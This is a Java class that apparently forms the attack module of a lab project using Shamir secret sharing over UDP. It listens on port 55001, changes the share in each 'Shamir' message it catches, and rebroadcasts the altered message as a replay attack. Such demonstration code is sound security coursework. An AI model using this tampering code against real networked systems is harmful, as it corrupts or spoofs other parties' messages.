package Attack.AttackUDP;

import UDP.UDPBroadcast;

import java.io.IOException;
import java.net.*;

public class AttackUDPReceive extends Thread{

    public void sendTemperMsg(String content) throws IOException {
        String ephIDHash = content.split(" ")[1];
        String prime = content.split(" ")[2];
        String share = content.split(" ")[3] + "1";
        String temperMsg = "Shamir " + ephIDHash + " " + prime + " " + share;
        UDPBroadcast.broadcast(temperMsg, InetAddress.getByName("255.255.255.255"));
    }

    public void run() {
        while (true) {
            DatagramSocket ds = null;
            try {
                ds = new DatagramSocket(null);
                ds.setReuseAddress(true);
                ds.bind(new InetSocketAddress(55001));
            } catch (SocketException e) {
                e.printStackTrace();
            }

            byte[] data = new byte[1024];
            DatagramPacket dp = new DatagramPacket(data, data.length);
            try {
                ds.receive(dp);
            } catch (IOException e) {
                e.printStackTrace();
            }

            String content = new String(data, 0, dp.getLength());
            if (content.split(" ")[0].equals("Shamir")) {
                System.out.println("Catch the Shamir UDP message, temper it and initiate replay attack.\n");
                try {
                    sendTemperMsg(content);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
